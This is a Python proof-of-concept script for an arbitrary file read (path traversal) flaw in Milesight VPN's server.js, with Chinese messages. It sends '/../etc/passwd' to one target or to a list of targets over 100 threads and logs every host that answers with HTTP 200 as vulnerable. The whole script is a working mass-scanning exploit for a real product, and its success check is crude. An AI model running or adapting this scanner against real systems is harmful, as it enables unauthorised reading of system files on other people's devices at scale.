# Milesight VPN server.js 任意文件读取漏洞
import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""$$\      $$\ $$\ $$\                     $$\           $$\        $$\     
$$$\    $$$ |\__|$$ |                    \__|          $$ |       $$ |    
$$$$\  $$$$ |$$\ $$ | $$$$$$\   $$$$$$$\ $$\  $$$$$$\  $$$$$$$\ $$$$$$\   
$$\$$\$$ $$ |$$ |$$ |$$  __$$\ $$  _____|$$ |$$  __$$\ $$  __$$\\_$$  _|  
$$ \$$$  $$ |$$ |$$ |$$$$$$$$ |\$$$$$$\  $$ |$$ /  $$ |$$ |  $$ | $$ |    
$$ |\$  /$$ |$$ |$$ |$$   ____| \____$$\ $$ |$$ |  $$ |$$ |  $$ | $$ |$$\ 
$$ | \_/ $$ |$$ |$$ |\$$$$$$$\ $$$$$$$  |$$ |\$$$$$$$ |$$ |  $$ | \$$$$  |
\__|     \__|\__|\__| \_______|\_______/ \__| \____$$ |\__|  \__|  \____/ 
                                             $$\   $$ |                   
                                             \$$$$$$  |                   
                                              \______/                    
                                                                author:CHKer
                                                                version:1.0.0
"""

    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='Milesight VPN server.js 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    payload= '/../etc/passwd'
    headers={
        'Accept':'/',
        'Content-Type':'application/x-www-form-urlencoded'
    }

    try:
        res1=requests.get(url=target+payload,headers=headers,timeout=10)
        if res1.status_code==200:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()